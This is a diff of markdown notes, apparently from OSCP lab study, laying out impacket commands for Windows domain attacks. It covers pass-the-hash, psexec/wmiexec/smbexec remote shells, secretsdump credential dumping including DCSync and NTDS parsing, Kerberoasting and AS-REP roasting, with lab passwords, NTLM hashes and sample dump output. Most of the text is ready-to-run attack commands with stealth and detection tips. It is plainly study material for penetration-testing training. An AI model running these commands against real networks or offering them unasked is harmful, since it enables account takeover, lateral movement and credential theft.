@@ -11,9 +11,9 @@ All impacket scripts follow the same auth pattern:
 # Password
 python3 script.py domain/username:password@TARGET_IP
 
-# Pass-the-Hash (use NTLM hash instead of password)
+# Pass-the-Hash (NTLM hash instead of password)
+# Format is LMHASH:NTHASH — if you only have NT hash, put colon before it
 python3 script.py domain/username@TARGET_IP -hashes :NTLMHASH
-# Note: format is LMHASH:NTHASH — if you only have NT, just put a colon before it
 
 # Kerberos ticket (from ccache file)
 export KRB5CCNAME=/path/to/ticket.ccache
@@ -22,10 +22,27 @@ python3 script.py domain/username@TARGET_IP -k -no-pass
 
 ---
 
+## Universal Flags (work on almost every script)
+```
+-hashes LMHASH:NTHASH    Pass-the-Hash instead of password
+                          If you only have NT hash: -hashes :NTLMHASH
+
+-no-pass                  Don't prompt for password (use with -k for Kerberos)
+
+-k                        Use Kerberos auth from ccache file (set KRB5CCNAME first)
+
+-dc-ip                    IP of the Domain Controller
+                          Use when DNS isn't resolving domain names properly
+
+-target-ip                IP of the actual target machine
+                          Use when target is a hostname your Kali can't resolve
+```
+
+---
+
 ## Remote Execution — Getting a Shell
 
-These three all give you a shell but work differently under the hood.
-Try them in order if one fails.
+Try in this order if one fails: psexec -> wmiexec -> smbexec -> dcomexec
 
 ### psexec.py — Most reliable shell, noisy (writes a service binary to disk)
 ```
@@ -33,7 +50,7 @@ python3 psexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
 python3 psexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
 ```
 - Gives a SYSTEM shell (highest privilege)
-- Detected easily — writes a binary to ADMIN$
+- Writes a binary to ADMIN$ — detected easily by AV
 - Requires: local admin access
 
 ### wmiexec.py — Semi-interactive shell via WMI, stealthier than psexec
@@ -42,15 +59,15 @@ python3 wmiexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
 python3 wmiexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
 ```
 - Runs as Administrator (not SYSTEM)
-- Does NOT write a binary to disk — much stealthier
-- Good fallback when psexec fails
+- Does NOT write a binary to disk
+- Good first fallback when psexec fails
 
 ### smbexec.py — Shell via SMB, no writable share needed
 ```
 python3 smbexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
 python3 smbexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
 ```
-- Similar to psexec but does NOT use RemComSvc
+- Does NOT use RemComSvc like psexec
 - Creates a local smbserver to receive output
 - Useful when target has no writable share
 
@@ -59,50 +76,92 @@ python3 smbexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfc
 python3 atexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159 'whoami'
 ```
 - Not a shell — executes ONE command and returns output
-- Useful when you just need to grab a file or run one thing
 
-### dcomexec.py — Shell via DCOM, alternative to wmiexec
+### dcomexec.py — Shell via DCOM, last resort alternative to wmiexec
 ```
 python3 dcomexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
 ```
-- Uses DCOM endpoints instead of WMI
-- Another fallback option if wmiexec/psexec are blocked
+
+---
+
+## Quick Reference — Which Shell Script To Use?
+```
+psexec.py   -> SYSTEM shell, noisy, most reliable
+wmiexec.py  -> Admin shell, stealthy, no disk writes
+smbexec.py  -> Admin shell, no writable share needed
+atexec.py   -> Single command only, no shell
+dcomexec.py -> Admin shell, uses DCOM (last resort)
+```
 
 ---
 
 ## secretsdump.py — Dump Credentials
 
-The most important impacket script for OSCP. Dumps SAM, LSA, cached creds.
-
-### Dump everything from a regular machine (what we ran on CLIENT01)
+### MODE 1: Remote dump from a live machine
 ```
+# Dump everything (SAM + LSA + cached creds)
 python3 secretsdump.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
-```
 
-### Pass-the-Hash version
-```
+# Pass-the-Hash version
 python3 secretsdump.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
 ```
 
-### DCSync — Dump ALL domain hashes from a Domain Controller (the holy grail)
+### MODE 2: LOCAL — parse files you already downloaded to Kali
 ```
-python3 secretsdump.py zeus.corp/Administrator:password@DC_IP -just-dc-ntlm
+# You have: sam + system files downloaded from target
+python3 secretsdump.py -sam /path/to/sam -system /path/to/system LOCAL
+
+# Real example from this lab:
+python3 secretsdump.py -sam ~/tools/File\ Transfer/sam -system ~/tools/File\ Transfer/system LOCAL
+
+# With NTDS.dit (grabbed from a DC):
+python3 secretsdump.py -system /path/to/system -ntds /path/to/ntds.dit LOCAL
+
+# With NTDS.dit — only output NTLM hashes (cleaner):
+python3 secretsdump.py -system /path/to/system -ntds /path/to/ntds.dit LOCAL -just-dc-ntlm
+
+# With NTDS.dit — include password history and account status:
+python3 secretsdump.py -system /path/to/system -ntds /path/to/ntds.dit LOCAL -just-dc-ntlm -history -user-status
 ```
-- -just-dc-ntlm = only pull NTLM hashes (cleaner output)
-- -just-dc = pull everything including Kerberos keys
-- Only works against a DC, and only if your user has DCSync rights (usually Domain Admin)
+NOTE: LOCAL goes at the END of the command, not the beginning.
+NOTE: LOCAL means "parse files on my Kali" — no target IP needed.
+
+### MODE 3: DCSync — pull hashes directly from a DC over the network
+```
+# Requires DCSync rights (Domain Admin or delegated replication rights)
+python3 secretsdump.py zeus.corp/Administrator:password@192.168.158.158 -just-dc-ntlm
+
+# Dump only a specific user from the DC:
+python3 secretsdump.py zeus.corp/Administrator:password@192.168.158.158 -just-dc-user Administrator
+
+# PTH version:
+python3 secretsdump.py zeus.corp/Administrator@192.168.158.158 -hashes :NTLMHASH -just-dc-ntlm
+```
+
+### Useful secretsdump flags
+```
+-just-dc-ntlm     Only dump NTLM hashes from DC (cleaner output, skip Kerberos keys)
+-just-dc          Dump everything from DC including Kerberos keys
+-just-dc-user     Only dump one specific user from the DC
+-history          Include password history (old passwords, useful for cracking patterns)
+-user-status      Show whether each account is Enabled or Disabled
+-outputfile       Save results to a file instead of just printing
+```
 
 ### What secretsdump output means
 ```
-# SAM hashes (local accounts on that machine)
+# SAM hashes — local accounts on that machine
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
-                                                    ^--- this part is the NTLM hash you use
+                                                    ^--- this is the NTLM hash you use for PTH
 
-# Cached domain logon (DCC2) — NOT usable for PTH, need to crack with hashcat -m 2100
+# Cached domain logon (DCC2) — NOT usable for PTH, crack offline with hashcat -m 2100
 ZEUS.CORP/o.foller:$DCC2$10240#o.foller#02b31594bda9e176c8cb8e3b8c9a9395
 
 # LSA Secrets — plaintext passwords stored for services/scheduled tasks
-zeus\o.foller:EarlyMorningFootball777    <- jackpot, use this directly
+zeus\o.foller:EarlyMorningFootball777    <- use this directly
+
+# Machine account keys — computer account, useful for Kerberos attacks
+zeus\CLIENT01$:aad3b435b51404eeaad3b435b51404ee:1a1655aa3814ae5ac13899d8f52788ad:::
 ```
 
 ---
@@ -114,18 +173,17 @@ zeus\o.foller:EarlyMorningFootball777    <- jackpot, use this directly
 python3 GetUserSPNs.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -request
 ```
 - Finds service accounts with SPNs and requests their tickets
-- Tickets can be cracked offline with hashcat (-m 13100)
-- No special privileges needed — any domain user can do this
+- Crack tickets offline: hashcat -m 13100
+- Any domain user can do this — no special privileges needed
 
-### GetNPUsers.py — AS-REP Roasting (attack accounts with no pre-auth required)
+### GetNPUsers.py — AS-REP Roasting (accounts with no pre-auth required)
 ```
 python3 GetNPUsers.py zeus.corp/ -usersfile users.txt -dc-ip 192.168.158.158 -no-pass
 python3 GetNPUsers.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158
 ```
-- Finds accounts that don't require Kerberos pre-authentication
-- Returns crackable hashes (hashcat -m 18200)
+- Returns crackable hashes: hashcat -m 18200
 
-### getTGT.py — Request a TGT ticket (used for Kerberos auth with other tools)
+### getTGT.py — Request a TGT (load it for Kerberos auth with other tools)
 ```
 python3 getTGT.py zeus.corp/o.foller:EarlyMorningFootball777
 python3 getTGT.py zeus.corp/o.foller -hashes :decca5b9babc228de4cedeb29a6b9abf
@@ -167,27 +225,19 @@ python3 smbclient.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.158.159
 
 ## Real Examples From This Lab
 ```
-# What we ran (correct version):
+# Remote dump CLIENT01 as Eric:
 python3 secretsdump.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
+
+# Parse downloaded SAM + SYSTEM files from DC01 locally:
+python3 secretsdump.py -sam ~/tools/File\ Transfer/sam -system ~/tools/File\ Transfer/system LOCAL
 
 # Get a shell on CLIENT01 as Eric:
 python3 psexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
 
-# PTH with local admin hash against VM1 and VM3:
+# PTH with local admin hash against other machines:
 python3 psexec.py zeus.corp/Administrator@192.168.158.158 -hashes :a1fcb4118dfcbf52a53d6299aab57055
 python3 psexec.py zeus.corp/Administrator@192.168.158.160 -hashes :a1fcb4118dfcbf52a53d6299aab57055
 
 # Kerberoast the domain as o.foller:
 python3 GetUserSPNs.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -request
-```
-
----
-
-## Quick Reference — Which Shell Script To Use?
-```
-psexec.py   -> SYSTEM shell, noisy, most reliable
-wmiexec.py  -> Admin shell, stealthy, no disk writes
-smbexec.py  -> Admin shell, no writable share needed
-atexec.py   -> Single command only, no shell
-dcomexec.py -> Admin shell, uses DCOM (last resort)
 ```
